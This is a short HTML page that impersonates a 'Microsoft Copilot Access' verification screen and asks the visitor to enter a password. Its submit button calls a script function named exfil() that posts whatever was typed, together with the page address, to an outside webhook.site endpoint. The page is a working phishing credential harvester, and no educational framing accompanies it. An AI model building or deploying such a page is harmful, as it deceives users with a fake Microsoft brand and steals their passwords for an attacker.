<!DOCTYPE html>
<html>
<head><title>Copilot Verification</title></head>
<body style="font-family:'Segoe UI', sans-serif; padding:30px;">
  <h2>Microsoft Copilot Access</h2>
  <p>Please verify your access to Copilot by answering below:</p>
  <input id="input" type="text" placeholder="Ask Copilot or verify password" style="width:300px; padding:10px;">
  <br><br>
  <button onclick="exfil()">Submit</button>

  <script>
    function exfil() {
      fetch("https://webhook.site/your-id", {
        method: "POST",
        body: JSON.stringify({
          value: document.getElementById("input").value,
          location: location.href
        }),
        headers: {
          "Content-Type": "application/json"
        }
      });
    }
  </script>
</body>
</html>
